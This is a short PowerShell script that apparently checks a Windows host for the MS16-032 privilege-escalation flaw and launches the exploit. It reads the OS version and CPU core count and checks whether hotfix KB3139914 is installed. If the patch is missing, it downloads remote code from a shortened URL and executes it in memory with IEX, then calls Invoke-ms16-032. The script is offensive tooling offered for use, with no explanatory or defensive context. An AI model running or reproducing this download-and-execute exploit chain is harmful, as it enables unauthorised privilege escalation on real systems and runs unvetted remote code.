$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
$Script:OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
echo "[?] Checking for MS16-032"
if (!($([System.Environment]::ProcessorCount) -eq 1)){"[?] CPU core count=$([System.Environment]::ProcessorCount)";
switch ($OSMajorMinor)
{
	'10.0' # Win10 / 2k16
	{echo "[?] Target is Win 10"}

	'6.3' # Win8.1 / 2k12R2
	{echo "[?] Target is Win 8.1"}

	'6.2' # Win8 / 2k12
	{echo "[?] Target is Win 8"}

	'6.1' # Win7 / 2k8R2
	{echo "[?] Target is Win 7"}

}
if(!(get-hotfix -id KB3139914 -ea 0)){"[!] Exploiting!";IEX (New-Object Net.WebClient).DownloadString('https://goo.gl/wrlBsL');Invoke-ms16-032}else{"[x] Not Exploitable!"}
}else{
"[?] race condition requires at least 2 CPU cores, not exploitable"}
